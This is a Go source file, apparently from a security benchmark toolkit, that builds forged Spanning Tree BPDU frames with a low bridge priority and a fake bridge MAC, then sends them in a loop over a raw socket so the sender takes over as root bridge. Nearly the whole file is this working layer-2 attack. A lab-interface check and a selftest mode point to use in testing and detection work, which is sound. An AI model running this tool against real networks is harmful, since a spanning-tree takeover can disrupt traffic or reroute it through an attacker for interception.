package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"

	"github.com/rohanpunj/iolbox/tools/secbench-attacks-go/internal/attackcommon"
)

const (
	stpLen       = 35
	stpLLCLen    = 3
	stpTaggedLen = 4
)

func buildBPDU(priority, vlan int, bridgeMAC net.HardwareAddr) ([]byte, error) {
	if len(bridgeMAC) != 6 {
		return nil, fmt.Errorf("bridge MAC must contain six octets")
	}
	if priority < 0 || priority > 0xffff {
		return nil, fmt.Errorf("priority must be between 0 and 65535")
	}
	if vlan < 0 || vlan > 0x0fff {
		return nil, fmt.Errorf("vlan must be between 0 and 4095")
	}

	stp := make([]byte, stpLen)
	// STP fields from trim-l2.py, including Scapy's fixed/default values.
	binary.BigEndian.PutUint16(stp[0:2], 0)
	stp[2] = 0
	stp[3] = 0
	stp[4] = 0
	binary.BigEndian.PutUint16(stp[5:7], uint16(priority))
	copy(stp[7:13], bridgeMAC)
	binary.BigEndian.PutUint32(stp[13:17], 0)
	binary.BigEndian.PutUint16(stp[17:19], uint16(priority))
	copy(stp[19:25], bridgeMAC)
	binary.BigEndian.PutUint16(stp[25:27], 0x8001)
	// Scapy's STP class defaults age to 1 (BCDFloatField("age", 1)), and the
	// Python script never overrides it — so the real wire value is 1*256,
	// not zero. Confirmed against a live capture diff, not assumed.
	binary.BigEndian.PutUint16(stp[27:29], 1*256)
	binary.BigEndian.PutUint16(stp[29:31], 20*256)
	binary.BigEndian.PutUint16(stp[31:33], 2*256)
	binary.BigEndian.PutUint16(stp[33:35], 15*256)

	llcAndSTPLen := stpLLCLen + stpLen
	payloadLen := llcAndSTPLen
	if vlan != 0 {
		payloadLen += stpTaggedLen
	}
	frame := make([]byte, 14+payloadLen)
	copy(frame[0:6], net.HardwareAddr{0x01, 0x80, 0xc2, 0x00, 0x00, 0x00})
	copy(frame[6:12], bridgeMAC)
	binary.BigEndian.PutUint16(frame[12:14], uint16(payloadLen))
	offset := 14
	if vlan != 0 {
		binary.BigEndian.PutUint16(frame[offset:offset+2], uint16(vlan))
		// Dot1Q.type is a length here because the following payload is LLC.
		binary.BigEndian.PutUint16(frame[offset+2:offset+4], uint16(llcAndSTPLen))
		offset += stpTaggedLen
	}
	frame[offset] = 0x42
	frame[offset+1] = 0x42
	frame[offset+2] = 3
	copy(frame[offset+stpLLCLen:], stp)
	return frame, nil
}

func run() int {
	fs, common := attackcommon.BaseParser("STP root hijack: send a superior BPDU to become root bridge")
	priority := fs.Int("priority", 0, "forged bridge priority (lower wins)")
	vlan := fs.Int("vlan", 0, "0 = untagged / no PVST tagging")
	if err := fs.Parse(os.Args[1:]); err != nil {
		return 2
	}
	if err := attackcommon.EnforceLabIface(common.Iface); err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 2
	}

	bridgeMAC := attackcommon.ForgedMAC()
	frame, err := buildBPDU(*priority, *vlan, bridgeMAC)
	if err != nil {
		attackcommon.Status("FATAL", fmt.Sprintf("BPDU packet build failed: %v", err))
		return 1
	}
	if common.Selftest {
		attackcommon.SelftestOK("stp_root", fmt.Sprintf("BPDU len=%d priority=%d", len(frame), *priority))
		return 0
	}

	sender, err := attackcommon.OpenRawSender(common.Iface)
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	defer sender.Close()

	_, err = attackcommon.RunLoop(common.Count, common.Interval, func(n int) error {
		frame, err := buildBPDU(*priority, *vlan, bridgeMAC)
		if err != nil {
			return err
		}
		if err := sender.Send(frame); err != nil {
			return fmt.Errorf("send BPDU: %w", err)
		}
		attackcommon.Status("SENT", fmt.Sprintf("BPDU #%d bridge-priority=%d bridge-mac=%s", n+1, *priority, bridgeMAC.String()))
		return nil
	})
	if err != nil {
		attackcommon.Status("FATAL", err.Error())
		return 1
	}
	return 0
}

func main() {
	os.Exit(run())
}
